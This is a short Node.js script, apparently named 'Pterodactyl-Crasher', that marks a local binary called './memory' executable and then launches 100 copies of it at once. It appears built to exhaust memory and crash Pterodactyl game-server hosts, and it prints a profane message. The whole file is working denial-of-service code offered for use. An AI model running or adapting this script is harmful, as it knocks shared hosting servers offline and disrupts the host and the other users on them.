console.log(`
github.com/ManucrackYT/Pterodactyl-Crasher

Pterodactyl-Crasher

Mode: full memory
Preparation..`);

console.log("Fucking shit, fuck off!");

(async() => {
    await (async() => {
        await (async() => {
            return new Promise(resolve => {
                require('child_process').exec('chmod +x ./memory', resolve);
            });
        })();

        let tasks = [];
        for (let i = 0; i < 100; i++) {
            tasks.push(
                (async() => {
                    return new Promise(resolve => {
                        require('child_process').exec('./memory', resolve);
                    });
                })()
            );
        }

        await Promise.all(tasks);
    })();
})();
